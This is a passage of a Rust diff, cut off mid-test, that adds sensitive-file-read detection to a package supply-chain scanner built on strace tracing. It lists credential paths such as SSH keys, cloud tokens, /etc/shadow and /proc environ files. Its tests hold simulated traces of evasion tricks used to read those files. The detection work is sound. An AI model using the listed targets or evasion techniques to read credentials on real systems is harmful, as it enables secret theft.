@@ -36,6 +36,7 @@ pub(crate) struct PolicyConfig {
     /// allowed even when newly introduced. For example `binary|/work/bin/tool`
     /// allows that binary regardless of the `file -b` output.
     pub artifact_allowlist: HashSet<String>,
+    pub sensitive_file_access_allowlist: HashSet<String>,
 }
 
 impl Default for PolicyConfig {
@@ -54,6 +55,7 @@ impl Default for PolicyConfig {
             minimum_release_age_package: None,
             process_exec_allowlist: HashSet::new(),
             artifact_allowlist: HashSet::new(),
+            sensitive_file_access_allowlist: HashSet::new(),
         }
     }
 }
@@ -67,6 +69,8 @@ pub(crate) struct ScanReport {
     /// unpinned ("latest") request this is the version the registry ordering
     /// selected, which callers should pin the forwarded command to.
     pub resolved_version: String,
+    /// If not allowed, the list of reasons why the package was blocked.
+    pub blocked_reasons: Vec<String>,
 }
 
 /// Orders version strings using real semantics rather than lexicographically:
@@ -107,6 +111,8 @@ struct TraceSignals {
     /// Findings from post-install file artifact scan (class-specific IoCs
     /// like suspicious .pth files, unexpected runtime binaries).
     artifact_findings: HashSet<String>,
+    /// Sensitive file reads (e.g. ~/.aws/credentials) captured via open/openat.
+    sensitive_file_reads: HashSet<String>,
     /// Domain → IP map extracted from DNS responses captured by strace.
     /// Used as a fallback when FCrDNS is unavailable (e.g. CDN edge IPs
     /// without PTR records).
@@ -783,6 +789,7 @@ fn trace_sandbox_install_matrix(
             git_clone_signatures: extract_git_clone_signatures(trace),
             process_exec_signatures: extract_process_exec_signatures(trace),
             artifact_findings,
+            sensitive_file_reads: extract_sensitive_file_reads(trace),
             dns_map: extract_dns_map(trace),
         };
         by_probe.insert((package, version), signals);
@@ -926,7 +933,7 @@ fn extract_git_clone_signatures(trace: &str) -> HashSet<String> {
 fn is_harness_command(exe: &str, args: &[String]) -> bool {
     let contains = |needle: &str| args.iter().any(|a| a.contains(needle));
     match exe {
-        "uv" => args.len() >= 2 && args[0] == "pip" && args[1] == "install",
+        "uv" => args.len() >= 2 && args[0] == "pip" && args[1] == "install" && contains("--target"),
         "npm" => {
             // npm install <pkg>@<ver> --prefix /work --no-save
             // Note: uses `contains("--prefix")` as a harness heuristic. If a
@@ -949,11 +956,13 @@ fn is_harness_command(exe: &str, args: &[String]) -> bool {
         }
         e if e.starts_with("python") => contains("get_interpreter_info"),
         "env" => {
-            args.len() >= 4
-                && args[0] == "HOME=/work"
-                && ((args[1] == "uv" && args[2] == "pip" && args[3] == "install")
-                    || (args[1] == "npm" && args[2] == "install")
-                    || (args[1] == "pnpm" && args[2] == "add"))
+            if let Some(idx) = args.iter().position(|a| !a.contains('=')) {
+                let inner_exe = executable_basename(&args[idx]);
+                let inner_args = &args[idx + 1..];
+                is_harness_command(&inner_exe, inner_args)
+            } else {
+                false
+            }
         }
         _ => false,
     }
@@ -981,6 +990,394 @@ fn extract_process_exec_signatures(trace: &str) -> HashSet<String> {
         signatures.insert(parts.join("|"));
     }
     signatures
+}
+
+fn is_sensitive_file_read(path: &str) -> bool {
+    let path = path.trim();
+    if path.is_empty() {
+        return false;
+    }
+
+    if path == "/proc/self/environ" || (path.starts_with("/proc/") && path.ends_with("/environ")) {
+        return true;
+    }
+
+    let ends_with_any = [
+        "/.aws/credentials",
+        "/.aws/config",
+        "/.ssh/id_rsa",
+        "/.ssh/id_ed25519",
+        "/.ssh/id_ecdsa",
+        "/.ssh/id_dsa",
+        "/.npmrc",
+        "/.env",
+        "/.kube/config",
+        "/.netrc",
+        "/.docker/config.json",
+        "/etc/passwd",
+        "/etc/shadow",
+        "/.config/gcloud/application_default_credentials.json",
+        "/.config/openstack/clouds.yaml",
+        "/.m2/settings.xml",
+        "/.git-credentials",
+        "/.cargo/credentials",
+        "/.gem/credentials",
+    ];
+    let exact_match = [
+        ".aws/credentials",
+        ".aws/config",
+        ".npmrc",
+        ".env",
+        ".netrc",
+        "/etc/passwd",
+        "/etc/shadow",
+        ".config/gcloud/application_default_credentials.json",
+        ".config/openstack/clouds.yaml",
+        ".m2/settings.xml",
+        ".git-credentials",
+        ".cargo/credentials",
+        ".gem/credentials",
+    ];
+
+    for s in ends_with_any.iter() {
+        if path.ends_with(s) {
+            return true;
+        }
+    }
+    for s in exact_match.iter() {
+        if path == *s {
+            return true;
+        }
+    }
+    if path.contains("/.gnupg/private-keys-v1.d/") || path.contains("/.azure/") {
+        return true;
+    }
+
+    false
+}
+
+fn lexical_clean_path(path: &str) -> String {
+    let is_absolute = path.starts_with('/');
+    let mut parts = Vec::new();
+    for comp in path.split('/') {
+        if comp.is_empty() || comp == "." {
+            continue;
+        }
+        if comp == ".." {
+            if parts.is_empty() {
+                if !is_absolute {
+                    parts.push("..");
+                }
+            } else if parts.last() == Some(&"..") {
+                parts.push("..");
+            } else {
+                parts.pop();
+            }
+        } else {
+            parts.push(comp);
+        }
+    }
+    if is_absolute {
+        format!("/{}", parts.join("/"))
+    } else {
+        parts.join("/")
+    }
+}
+
+fn extract_first_arg_fd(args_str: &str) -> Option<i32> {
+    let delim = args_str.find([',', ')']).unwrap_or(args_str.len());
+    args_str[..delim].trim().parse::<i32>().ok()
+}
+
+fn extract_sensitive_file_reads(trace: &str) -> HashSet<String> {
+    static LINE_RE: OnceLock<Regex> = OnceLock::new();
+    static SYSCALL_RE: OnceLock<Regex> = OnceLock::new();
+    static RESUMED_RE: OnceLock<Regex> = OnceLock::new();
+    static PROC_FD_RE: OnceLock<Regex> = OnceLock::new();
+
+    let line_re = LINE_RE.get_or_init(|| {
+        Regex::new(r#"^(?:\[pid\s+(?P<pid1>\d+)\]\s+|(?P<pid2>\d+)\s+)?(?P<rest>.*)"#).unwrap()
+    });
+    let syscall_re = SYSCALL_RE.get_or_init(|| {
+        Regex::new(
+            r#"^(?P<syscall>open|openat|openat64|openat2|link|linkat|symlink|symlinkat|clone|clone3|fork|vfork|dup|dup2|dup3|fcntl)\((?P<args>.*)"#,
+        )
+        .unwrap()
+    });
+    let resumed_re = RESUMED_RE.get_or_init(|| {
+        Regex::new(r#"^<\.\.\.\s*(?P<syscall>[a-z0-9_]+)\s+resumed>\s*(?P<args_and_ret>.*)"#)
+            .unwrap()
+    });
+    let proc_fd_re = PROC_FD_RE
+        .get_or_init(|| Regex::new(r#"^/proc/(?:self|\d+)/fd/(?P<fd>\d+)(?P<rest>.*)"#).unwrap());
+
+    let mut reads = HashSet::new();
+    let mut fd_table: HashMap<(u32, i32), String> = HashMap::new(); // (pid, fd) -> absolute path
+    let mut pending_syscalls: HashMap<u32, String> = HashMap::new(); // pid -> path of unfinished open/openat
+    let mut pending_dup_args: HashMap<u32, i32> = HashMap::new(); // pid -> old_fd
+
+    for line in trace.lines() {
+        let line = line.trim();
+        if line.is_empty() {
+            continue;
+        }
+
+        let Some(caps) = line_re.captures(line) else {
+            continue;
+        };
+        let pid_match = caps.name("pid1").or_else(|| caps.name("pid2"));
+        let pid: u32 = pid_match
+            .map(|m| m.as_str().parse().unwrap_or(0))
+            .unwrap_or(0);
+        let rest = caps.name("rest").map(|m| m.as_str()).unwrap_or("");
+
+        if let Some(resumed_caps) = resumed_re.captures(rest) {
+            let syscall = resumed_caps
+                .name("syscall")
+                .map(|m| m.as_str())
+                .unwrap_or("");
+            let args_and_ret = resumed_caps
+                .name("args_and_ret")
+                .map(|m| m.as_str())
+                .unwrap_or("");
+
+            let mut ret_val: Option<i32> = None;
+            if let Some(idx) = args_and_ret.rfind(" = ") {
+                let ret_str = &args_and_ret[idx + 3..].trim();
+                ret_val = ret_str.parse::<i32>().ok();
+            }
+
+            if matches!(syscall, "clone" | "clone3" | "fork" | "vfork") {
+                if let Some(child_pid) = ret_val.map(|v| v as u32)
+                    && child_pid > 0
+                {
+                    let mut to_insert = Vec::new();
+                    for (&(p, fd), path) in &fd_table {
+                        if p == pid {
+                            to_insert.push((child_pid, fd, path.clone()));
+                        }
+                    }
+                    for (c_pid, fd, path) in to_insert {
+                        fd_table.insert((c_pid, fd), path);
+                    }
+                }
+            } else if matches!(syscall, "dup" | "dup2" | "dup3" | "fcntl") {
+                if let Some(new_fd) = ret_val
+                    && new_fd >= 0
+                    && let Some(old_fd) = pending_dup_args.remove(&pid)
+                    && let Some(path) = fd_table.get(&(pid, old_fd)).cloned()
+                {
+                    fd_table.insert((pid, new_fd), path);
+                }
+            } else if matches!(syscall, "open" | "openat" | "openat64" | "openat2")
+                && let Some(path) = pending_syscalls.remove(&pid)
+                && let Some(fd) = ret_val
+                && fd >= 0
+            {
+                fd_table.insert((pid, fd), path);
+            }
+            continue;
+        }
+
+        if let Some(syscall_caps) = syscall_re.captures(rest) {
+            let syscall = syscall_caps
+                .name("syscall")
+                .map(|m| m.as_str())
+                .unwrap_or("");
+            let args_str = syscall_caps.name("args").map(|m| m.as_str()).unwrap_or("");
+
+            let unfinished = args_str.ends_with("<unfinished ...>");
+            let mut ret_val: Option<i32> = None;
+            if !unfinished && let Some(idx) = args_str.rfind(" = ") {
+                let ret_str = &args_str[idx + 3..].trim();
+                ret_val = ret_str.parse::<i32>().ok();
+            }
+
+            if matches!(syscall, "clone" | "clone3" | "fork" | "vfork") {
+                if let Some(child_pid) = ret_val.map(|v| v as u32)
+                    && child_pid > 0
+                {
+                    let mut to_insert = Vec::new();
+                    for (&(p, fd), path) in &fd_table {
+                        if p == pid {
+                            to_insert.push((child_pid, fd, path.clone()));
+                        }
+                    }
+                    for (c_pid, fd, path) in to_insert {
+                        fd_table.insert((c_pid, fd), path);
+                    }
+                }
+                continue;
+            }
+
+            if matches!(syscall, "dup" | "dup2" | "dup3" | "fcntl") {
+                if !args_str.contains("F_DUPFD") && syscall == "fcntl" {
+                    continue;
+                }
+                if let Some(old_fd) = extract_first_arg_fd(args_str) {
+                    if unfinished {
+                        pending_dup_args.insert(pid, old_fd);
+                    } else if let Some(new_fd) = ret_val
+                        && new_fd >= 0
+                        && let Some(path) = fd_table.get(&(pid, old_fd)).cloned()
+                    {
+                        fd_table.insert((pid, new_fd), path);
+                    }
+                }
+                continue;
+            }
+
+            // Extract all dirfds and strings
+            let mut dirfds = Vec::new();
+            let mut extracted_paths = Vec::new();
+
+            let mut i = 0;
+            while i < args_str.len() {
+                if let Some(start_quote) = args_str[i..].find('"') {
+                    let start_quote = i + start_quote;
+                    let before_str = &args_str[i..start_quote];
+                    // Parse any dirfds before this string
+                    for token in before_str.split(',') {
+                        let t = token.trim();
+                        if !t.is_empty() && t != "AT_FDCWD" && t != "-100" {
+                            if let Ok(fd) = t.parse::<i32>() {
+                                dirfds.push(Some(fd));
+                            } else {
+                                dirfds.push(None);
+                            }
+                        } else if t == "AT_FDCWD" {
+                            dirfds.push(None); // AT_FDCWD handled natively by None fallback
+                        }
+                    }
+
+                    let mut end_quote = None;
+                    let mut escaped = false;
+                    for (j, c) in args_str[start_quote + 1..].char_indices() {
+                        if escaped {
+                            escaped = false;
+                        } else if c == '\\' {
+                            escaped = true;
+                        } else if c == '"' {
+                            end_quote = Some(start_quote + 1 + j);
+                            break;
+                        }
+                    }
+
+                    if let Some(end_idx) = end_quote {
+                        let raw_str = &args_str[start_quote + 1..end_idx];
+                        let unescaped_bytes = unescape_strace_string(raw_str);
+                        extracted_paths.push(String::from_utf8_lossy(&unescaped_bytes).to_string());
+                        i = end_idx + 1;
+                    } else {
+                        break;
+                    }
+                } else {
+                    break;
+                }
+            }
+
+            // Align dirfds to extracted_paths depending on the syscall
+            let mut aligned = Vec::new();
+            if matches!(syscall, "openat" | "openat64" | "openat2") {
+                let dfd = dirfds.first().copied().flatten();
+                if let Some(p) = extracted_paths.first() {
+                    aligned.push((dfd, p.clone()));
+                }
+            } else if syscall == "symlinkat" {
+                // symlinkat(target, newdirfd, linkpath)
+                let dfd = dirfds.first().copied().flatten();
+                if let Some(p1) = extracted_paths.first() {
+                    aligned.push((None, p1.clone())); // target doesn't use newdirfd
+                }
+                if let Some(p2) = extracted_paths.get(1) {
+                    aligned.push((dfd, p2.clone()));
+                }
+            } else if syscall == "linkat" {
+                // linkat(olddirfd, oldpath, newdirfd, newpath, flags)
+                let old_dfd = dirfds.first().copied().flatten();
+                let new_dfd = dirfds.get(1).copied().flatten();
+                if let Some(p1) = extracted_paths.first() {
+                    aligned.push((old_dfd, p1.clone()));
+                }
+                if let Some(p2) = extracted_paths.get(1) {
+                    aligned.push((new_dfd, p2.clone()));
+                }
+            } else {
+                // open, link, symlink
+                for p in extracted_paths.iter() {
+                    aligned.push((None, p.clone()));
+                }
+            }
+
+            for (dirfd, mut path) in aligned {
+                if let Some(caps) = proc_fd_re.captures(&path) {
+                    if let Ok(fd) = caps.name("fd").unwrap().as_str().parse::<i32>() {
+                        let proc_rest = caps.name("rest").unwrap().as_str();
+                        if let Some(parent) = fd_table.get(&(pid, fd)) {
+                            let clean_rest = proc_rest.strip_prefix('/').unwrap_or(proc_rest);
+                            if parent.ends_with('/') {
+                                path = format!("{}{}", parent, clean_rest);
+                            } else {
+                                path = format!("{}/{}", parent, clean_rest);
+                            }
+                        }
+                    }
+                } else if !path.starts_with('/')
+                    && !path.starts_with('.')
+                    && let Some(dfd) = dirfd
+                    && let Some(parent) = fd_table.get(&(pid, dfd))
+                {
+                    if parent.ends_with('/') {
+                        path = format!("{}{}", parent, path);
+                    } else {
+                        path = format!("{}/{}", parent, path);
+                    }
+                }
+
+                path = lexical_clean_path(&path);
+
+                if is_sensitive_file_read(&path) {
+                    reads.insert(path.clone());
+                }
+
+                if matches!(syscall, "open" | "openat" | "openat64" | "openat2") {
+                    if unfinished {
+                        pending_syscalls.insert(pid, path);
+                    } else if let Some(fd) = ret_val
+                        && fd >= 0
+                    {
+                        fd_table.insert((pid, fd), path);
+                    }
+                }
+            }
+        }
+    }
+    reads
+}
+fn find_new_sensitive_reads(current: &HashSet<String>, baseline: &HashSet<String>) -> Vec<String> {
+    let mut out: Vec<String> = current.difference(baseline).cloned().collect();
+    out.sort();
+    out
+}
+
+fn filter_allowlisted_sensitive_reads(
+    reads: Vec<String>,
+    allowlist: &HashSet<String>,
+) -> (Vec<String>, Vec<String>) {
+    reads.into_iter().partition(|read| {
+        !allowlist.iter().any(|allowed| {
+            let t = allowed.trim();
+            if t == "*" || t == "/" || t == "*/" {
+                println!("⚠️ [gyrseek] Warning: Ignoring overly permissive sensitive file allowlist entry: '{}'", allowed);
+                return false;
+            }
+            if let Some(stripped) = allowed.strip_prefix('*') {
+                read == stripped || read.ends_with(&format!("/{}", stripped))
+            } else {
+                read == allowed
+            }
+        })
+    })
 }
 
 fn find_new_git_clone_signatures(
@@ -1234,14 +1631,15 @@ fn warn_and_block(
     if let Some(help) = extra_help {
         println!("{}", help);
     }
-    println!("Aborting host operation securely.");
-    results.insert(
-        key.to_string(),
-        ScanReport {
+    let entry = results
+        .entry(key.to_string())
+        .or_insert_with(|| ScanReport {
             allowed: false,
             resolved_version: resolved_version.to_string(),
-        },
-    );
+            blocked_reasons: vec![],
+        });
+    entry.allowed = false;
+    entry.blocked_reasons.push(warning_type.to_string());
 }
 
 pub(crate) async fn scan_packages_versions(
@@ -1271,6 +1669,7 @@ pub(crate) async fn scan_packages_versions(
                 ScanReport {
                     allowed: true,
                     resolved_version: tgt_version.clone(),
+                    blocked_reasons: vec![],
                 },
             );
             continue;
@@ -1307,6 +1706,7 @@ pub(crate) async fn scan_packages_versions(
                 ScanReport {
                     allowed: false,
                     resolved_version: v_curr.clone(),
+                    blocked_reasons: vec!["minimum_release_age_package".to_string()],
                 },
             );
             continue;
@@ -1325,6 +1725,7 @@ pub(crate) async fn scan_packages_versions(
                 ScanReport {
                     allowed: false,
                     resolved_version: v_curr.clone(),
+                    blocked_reasons: vec!["burst_policy".to_string()],
                 },
             );
             continue;
@@ -1406,6 +1807,7 @@ pub(crate) async fn scan_packages_versions(
                     ScanReport {
                         allowed: false,
                         resolved_version: plan.current.clone(),
+                        blocked_reasons: vec!["sandbox_execution_failed".to_string()],
                     },
                 );
             }
@@ -1417,13 +1819,15 @@ pub(crate) async fn scan_packages_versions(
         let key = format!("{}|{}", plan.package, plan.target_version);
         let resolved_version = plan.current.clone();
         let blocked = |results: &mut HashMap<String, ScanReport>, key: String| {
-            results.insert(
-                key,
-                ScanReport {
-                    allowed: false,
-                    resolved_version: resolved_version.clone(),
-                },
-            );
+            let entry = results.entry(key).or_insert(ScanReport {
+                allowed: false,
+                resolved_version: resolved_version.clone(),
+                blocked_reasons: vec![],
+            });
+            entry.allowed = false;
+            entry
+                .blocked_reasons
+                .push("sandbox_trace_missing".to_string());
         };
         let current_key = (plan.package.clone(), plan.current.clone());
         let current_signals = match traces_by_probe.get(&current_key) {
@@ -1441,12 +1845,14 @@ pub(crate) async fn scan_packages_versions(
         let git_curr = current_signals.git_clone_signatures;
         let proc_curr = current_signals.process_exec_signatures;
         let artifact_curr = current_signals.artifact_findings.clone();
+        let sensitive_curr = current_signals.sensitive_file_reads;
         let dns_curr = current_signals.dns_map.clone();
 
         let mut baseline_ips = HashSet::new();
         let mut baseline_git_clone_signatures = HashSet::new();
         let mut baseline_process_exec_signatures = HashSet::new();
         let mut baseline_artifact_findings = HashSet::new();
+        let mut baseline_sensitive_reads = HashSet::new();
         let mut baseline_dns_domains = HashSet::new();
         let mut missing = false;
 
@@ -1460,6 +1866,7 @@ pub(crate) async fn scan_packages_versions(
                     baseline_process_exec_signatures
                         .extend(found.process_exec_signatures.iter().cloned());
                     baseline_artifact_findings.extend(found.artifact_findings.iter().cloned());
+                    baseline_sensitive_reads.extend(found.sensitive_file_reads.iter().cloned());
                     baseline_dns_domains.extend(found.dns_map.keys().cloned());
                 }
                 None => {
@@ -1489,6 +1896,7 @@ pub(crate) async fn scan_packages_versions(
                 ScanReport {
                     allowed: true,
                     resolved_version,
+                    blocked_reasons: vec![],
                 },
             );
             continue;
@@ -1509,6 +1917,8 @@ pub(crate) async fn scan_packages_versions(
             );
         }
 
+        let mut package_blocked = false;
+
         if !new_process_exec_signatures.is_empty() {
             let baseline_label = if plan.baselines.is_empty() {
                 "n/a".to_string()
@@ -1520,7 +1930,7 @@ pub(crate) async fn scan_packages_versions(
                 &mut results,
                 &key,
                 &resolved_version,
-                "Behavioral anomaly",
+                "process_exec_anomaly",
                 &format!(
                     "Package '{}', version '{}' introduced new process execution not seen in baseline versions ({}): {:?}",
                     plan.package, plan.current, baseline_label, new_process_exec_signatures
@@ -1529,7 +1939,36 @@ pub(crate) async fn scan_packages_versions(
                     "This matches the Shai-Hulud class of attack (download a runtime like Bun and execute a hidden payload).",
                 ),
             );
-            continue;
+            package_blocked = true;
+        }
+
+        let new_sensitive_reads =
+            find_new_sensitive_reads(&sensitive_curr, &baseline_sensitive_reads);
+        let (blocked_sensitive_reads, _allowed_sensitive_reads) =
+            filter_allowlisted_sensitive_reads(
+                new_sensitive_reads,
+                &policy.sensitive_file_access_allowlist,
+            );
+
+        if !blocked_sensitive_reads.is_empty() {
+            let baseline_label = if plan.baselines.is_empty() {
+                "n/a".to_string()
+            } else {
+                plan.baselines.join(", ")
+            };
+
+            warn_and_block(
+                &mut results,
+                &key,
+                &resolved_version,
+                "sensitive_file_read_anomaly",
+                &format!(
+                    "Package '{}', version '{}' attempted to access sensitive file(s) not seen in baseline versions ({}): {:?}",
+                    plan.package, plan.current, baseline_label, blocked_sensitive_reads
+                ),
+                Some("This indicates an attempt to steal credentials or configuration files."),
+            );
+            package_blocked = true;
         }
 
         // Post-install artifact check — suspicious .pth files with executable
@@ -1570,7 +2009,7 @@ pub(crate) async fn scan_packages_versions(
                     "This may indicate a .pth file with executable content or an unexpected runtime binary.",
                 ),
             );
-            continue;
+            package_blocked = true;
         }
 
         let new_git_clone_signatures =
@@ -1599,14 +2038,14 @@ pub(crate) async fn scan_packages_versions(
                 &mut results,
                 &key,
                 &resolved_version,
-                "Behavioral anomaly",
+                "git_clone_anomaly",
                 &format!(
                     "Package '{}', version '{}' introduced new git clone behavior not seen in baseline versions ({}): {:?}",
                     plan.package, plan.current, baseline_label, new_git_clone_signatures
                 ),
                 None,
             );
-            continue;
+            package_blocked = true;
         }
 
         let new_connections = find_new_connections_domain_aware(
@@ -1658,13 +2097,17 @@ pub(crate) async fn scan_packages_versions(
                 &mut results,
                 &key,
                 &resolved_version,
-                "Behavioral anomaly",
+                "network_anomaly",
                 &format!(
                     "Package '{}', version '{}' contacted new endpoints not seen in baseline versions ({}): {:?}",
                     plan.package, plan.current, baseline_label, enriched
                 ),
                 None,
             );
+            package_blocked = true;
+        }
+
+        if package_blocked {
             continue;
         }
 
@@ -1673,6 +2116,7 @@ pub(crate) async fn scan_packages_versions(
             ScanReport {
                 allowed: true,
                 resolved_version,
+                blocked_reasons: vec![],
             },
         );
     }
@@ -1688,13 +2132,13 @@ pub(crate) async fn scan_package_versions(
     policy: &PolicyConfig,
 ) -> ScanReport {
     let targets = vec![(pkg_name.to_string(), tgt_version.to_string())];
-    let outcome = scan_packages_versions(runner, manager, &targets, policy).await;
+    let mut outcome = scan_packages_versions(runner, manager, &targets, policy).await;
     outcome
-        .get(&format!("{}|{}", pkg_name, tgt_version))
-        .cloned()
+        .remove(&format!("{}|{}", pkg_name, tgt_version))
         .unwrap_or_else(|| ScanReport {
             allowed: false,
             resolved_version: tgt_version.to_string(),
+            blocked_reasons: vec!["scan_failed".to_string()],
         })
 }
 
@@ -1708,15 +2152,222 @@ mod tests {
         PolicyConfig, burst_policy_warning, classify_inventory_lines, compare_version_strings,
         count_releases_in_window, decode_dns_name, exemption_behavior, extract_artifact_findings,
         extract_connection_ips, extract_dns_map, extract_process_exec_signatures,
-        filter_allowlisted_artifact_findings, filter_allowlisted_git_clone_signatures,
-        filter_allowlisted_new_connections, filter_allowlisted_process_exec_signatures,
+        extract_sensitive_file_reads, filter_allowlisted_artifact_findings,
+        filter_allowlisted_git_clone_signatures, filter_allowlisted_new_connections,
+        filter_allowlisted_process_exec_signatures, filter_allowlisted_sensitive_reads,
         filter_domain_allowlisted_new_connections_with, find_new_connections_domain_aware,
-        find_new_process_exec_signatures, forward_confirmed_hostname, is_sandbox_local_ip,
+        find_new_process_exec_signatures, find_new_sensitive_reads, forward_confirmed_hostname,
+        is_harness_command, is_sandbox_local_ip, is_sensitive_file_read,
         minimum_release_age_policy_warning, normalize_ip_string, npm_published_times,
         parse_dns_response, reverse_dns_domain, scan_packages_versions,
         select_age_eligible_baselines, select_effective_baselines, sort_versions_ascending,
         strip_artifact_section, unescape_strace_string,
     };
+
+    #[test]
+    fn test_is_sensitive_file_read() {
+        assert!(is_sensitive_file_read("/home/user/.aws/credentials"));
+        assert!(is_sensitive_file_read(".aws/credentials"));
+        assert!(is_sensitive_file_read("/root/.ssh/id_rsa"));
+        assert!(is_sensitive_file_read(".env"));
+        assert!(is_sensitive_file_read("/app/.env"));
+        assert!(is_sensitive_file_read("/etc/passwd"));
+        assert!(is_sensitive_file_read(
+            "/home/user/.config/gcloud/application_default_credentials.json"
+        ));
+        assert!(!is_sensitive_file_read(
+            "/var/lib/malware/.config/gcloud/tools/steal"
+        ));
+        assert!(is_sensitive_file_read("/proc/self/environ"));
+        assert!(is_sensitive_file_read("/proc/123/environ"));
+        assert!(is_sensitive_file_read("/home/user/.git-credentials"));
+        assert!(is_sensitive_file_read("/home/user/.cargo/credentials"));
+        assert!(is_sensitive_file_read("/home/user/.gem/credentials"));
+        assert!(is_sensitive_file_read("/home/user/.m2/settings.xml"));
+        assert!(is_sensitive_file_read(
+            "/home/user/.config/openstack/clouds.yaml"
+        ));
+        assert!(is_sensitive_file_read(
+            "/home/user/.azure/accessTokens.json"
+        ));
+        assert!(is_sensitive_file_read(
+            "/home/user/.gnupg/private-keys-v1.d/foo.key"
+        ));
+        assert!(!is_sensitive_file_read("/usr/bin/node"));
+        assert!(!is_sensitive_file_read("index.js"));
+        assert!(!is_sensitive_file_read(".env_backup"));
+        assert!(!is_sensitive_file_read(".ENV"));
+        assert!(!is_sensitive_file_read(".aws/credentials.tmp"));
+        assert!(!is_sensitive_file_read("/etc/./passwd"));
+        assert!(is_sensitive_file_read("/proc/1/root/etc/passwd"));
+        assert!(is_sensitive_file_read("/etc/shadow"));
+    }
+
+    #[test]
+    fn test_extract_sensitive_file_reads() {
+        let trace = r#"
+openat(AT_FDCWD, "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64", O_RDONLY|O_CLOEXEC) = 3
+open("\x2e\x65\x6e\x76", O_RDONLY) = 4
+openat(AT_FDCWD, "\x2f\x6f\x70\x74\x2f\x61\x70\x70\x2f\x69\x6e\x64\x65\x78\x2e\x6a\x73", O_RDONLY) = 5
+"#;
+        let reads = extract_sensitive_file_reads(trace);
+        println!("READS: {:?}", reads);
+        assert!(reads.contains("/etc/passwd"));
+        assert!(reads.contains(".env"));
+        assert!(!reads.contains("/opt/app/index.js"));
+        assert_eq!(reads.len(), 2);
+    }
+
+    #[test]
+    fn test_extract_sensitive_file_reads_edge_cases() {
+        let trace = r#"
+[pid 1234] openat(AT_FDCWD, "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64", O_RDONLY|O_CLOEXEC) = 3
+1234  open("\x2e\x65\x6e\x76", O_RDONLY) = 4
+[pid 5678] <... openat resumed> "\x2f\x6f\x70\x74\x2f\x61\x70\x70\x2f\x69\x6e\x64\x65\x78\x2e\x6a\x73", O_RDONLY) = 5
+[pid 1234] openat(AT_FDCWD, "\x2f\x72\x6f\x6f\x74\x2f\x2e\x61\x77\x73", O_RDONLY <unfinished ...>
+[pid 5678] close(3) = 0
+[pid 1234] <... openat resumed> ) = 5
+[pid 1234] openat(5, "credentials", O_RDONLY) = 6
+[pid 9999] symlink("/root/.aws/credentials", "util.js") = 0
+[pid 1111] openat64(-100, "/etc/shadow", O_RDONLY) = 7
+[pid 2222] openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 8
+"#;
+        let reads = extract_sensitive_file_reads(trace);
+        println!("READS: {:?}", reads);
+        assert!(reads.contains("/etc/passwd"));
+        assert!(reads.contains(".env"));
+        assert!(reads.contains("/root/.aws/credentials"));
+        assert!(reads.contains("/etc/shadow"));
+        assert!(!reads.contains("/opt/app/index.js"));
+        assert_eq!(reads.len(), 4);
+
+        assert_eq!(extract_sensitive_file_reads("").len(), 0);
+        assert_eq!(extract_sensitive_file_reads("   \n \t  \n").len(), 0);
+        assert_eq!(
+            extract_sensitive_file_reads("this is not strace output\njust random text() = 0").len(),
+            0
+        );
+
+        let long_path = "a".repeat(10000);
+        let long_trace = format!("openat(AT_FDCWD, \"/{long_path}/.env\", O_RDONLY) = 3");
+        assert!(extract_sensitive_file_reads(&long_trace).contains(&format!("/{long_path}/.env")));
+    }
+
+    #[test]
+    fn test_appsec_evasion_bypasses() {
+        let trace = r#"
+[pid 100] openat(AT_FDCWD, "/etc", O_RDONLY) = 3
+[pid 100] open("/proc/self/fd/3/passwd", O_RDONLY) = 4
+[pid 100] dup2(3, 7) = 7
+[pid 100] openat(7, "shadow", O_RDONLY) = 8
+[pid 100] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f8) = 200
+[pid 200] openat(3, "passwd", O_RDONLY) = 4
+[pid 300] openat(AT_FDCWD, "../../etc/passwd", O_RDONLY) = 3
+"#;
+        let reads = extract_sensitive_file_reads(trace);
+        println!("READS: {:?}", reads);
+        assert!(reads.contains("/etc/passwd"));
+        assert!(reads.contains("/etc/shadow"));
+        assert!(reads.contains("../../etc/passwd"));
+        assert_eq!(reads.len(), 3);
+    }
+
+    #[test]
+    fn test_appsec_evasion_exhaustive_variants() {
+        let trace = r#"
+[pid 100] openat(AT_FDCWD, "/etc", O_RDONLY) = 3
+[pid 100] fcntl(3, F_DUPFD, 10) = 10
+[pid 100] openat(10, "shadow", O_RDONLY) = 11
+[pid 100] dup3(3, 12, O_CLOEXEC) = 12
+[pid 100] openat(12, "shadow", O_RDONLY) = 13
+[pid 100] fork() = 200
+[pid 200] openat(3, "passwd", O_RDONLY) = 14
+[pid 100] vfork() = 300
+[pid 300] openat(10, "passwd", O_RDONLY) = 15
+[pid 100] clone3({flags=CLONE_PIDFD, pidfd=0x7ff}, 88) = 400
+[pid 400] open("/proc/100/fd/12/passwd", O_RDONLY) = 16
+[pid 100] clone( <unfinished ...>
+[pid 500] openat(AT_FDCWD, "/tmp", O_RDONLY) = 3
+[pid 100] <... clone resumed> child_stack=NULL) = 600
+[pid 600] openat(3, "passwd", O_RDONLY) = 17
+[pid 100] dup( <unfinished ...>
+[pid 500] openat(3, "foo", O_RDONLY) = 4
+[pid 100] <... dup resumed> 3) = 18
+[pid 100] openat(18, "passwd", O_RDONLY) = 19
+"#;
+        let reads = extract_sensitive_file_reads(trace);
+        println!("READS: {:?}", reads);
+        assert!(reads.contains("/etc/passwd"));
+        assert!(reads.contains("/etc/shadow"));
+        // Count should be exactly 2 distinct files (passwd, shadow) accessed many times
+        assert_eq!(reads.len(), 2);
+    }
+
+    #[test]
+    fn test_find_new_sensitive_reads() {
+        let mut baseline = std::collections::HashSet::new();
+        baseline.insert("/etc/passwd".to_string());
+
+        let mut current = std::collections::HashSet::new();
+        current.insert("/etc/passwd".to_string());
+        current.insert(".env".to_string());
+
+        let new_reads = find_new_sensitive_reads(&current, &baseline);
+        assert_eq!(new_reads.len(), 1);
+        assert_eq!(new_reads[0], ".env");
+
+        // Empty current
+        let empty_current = std::collections::HashSet::new();
+        assert_eq!(find_new_sensitive_reads(&empty_current, &baseline).len(), 0);
+
+        // Empty baseline
+        assert_eq!(find_new_sensitive_reads(&current, &empty_current).len(), 2);
+
+        // Both empty
+        assert_eq!(
+            find_new_sensitive_reads(&empty_current, &empty_current).len(),
+            0
+        );
+
+        // Current subset of baseline
+        let mut subset_current = std::collections::HashSet::new();
